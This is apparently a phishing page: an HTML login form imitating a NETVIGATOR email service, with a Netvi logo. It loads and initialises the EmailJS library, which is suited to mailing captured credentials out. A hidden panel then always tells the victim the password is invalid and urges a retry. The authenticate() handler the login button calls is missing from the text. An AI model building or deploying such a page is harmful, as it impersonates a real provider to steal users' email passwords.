<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Your Account</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("WWo7anZY4HvX4SL2h");
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg');
      background-size: contain;
      background-position: top center;
      background-repeat: no-repeat;
      background-color: #000;
      height: 100vh;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .login-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.3);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .login-box {
      background-color: rgba(40, 40, 40, 0.95);
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 90%;
      border-top: 5px solid #f07c00;
      text-align: center;
    }

    .login-logo {
      width: 150px;
      margin-bottom: 10px;
    }

    h2 {
      color: #fff;
      font-weight: bold;
      margin: 10px 0;
    }

    input {
      width: 85%;
      padding: 8px;
      margin: 10px 0;
      border: 1px solid #555;
      border-radius: 6px;
      background-color: #222;
      color: white;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      background-color: #f07c00;
      color: white;
      border: none;
      padding: 10px;
      width: 85%;
      cursor: pointer;
      border-radius: 6px;
      font-weight: bold;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #d96b00;
    }

    .forgot-password {
      color: #f07c00;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    #confirmation {
      display: none;
      background-color: rgba(40, 40, 40, 0.95);
      width: 100%;
      max-width: 400px;
      padding: 20px;
      margin: 100px auto;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      border-top: 5px solid #f07c00;
    }

    #confirmation p {
      color: #fff;
      font-size: 18px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <div id="login" class="login-container">
    <div class="login-box">
      <img src="https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg" alt="Netvi Logo" class="login-logo">
      <h2>Email service login</h2>
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button onclick="authenticate()">Login</button>
      <p><a href="#" class="forgot-password">If you are not yet a NETVIGATOR user, please click here to apply.</a></p>
    </div>
  </div>

  <div id="confirmation">
    <h2 style="color: white;">Re-enable Your Two-factor Authentication (2FA)</h2>
    <p>The password is invalid, please re-enter it.</p>
    <button onclick="retryLogin()">Re-try</button>
  </div>

  <script>
    function retryLogin() {
      document.getElementById("confirmation").style.display = "none"; 
      document.getElementById("login").style.display = "flex"; 
    }
  </script>
</body>
</html>
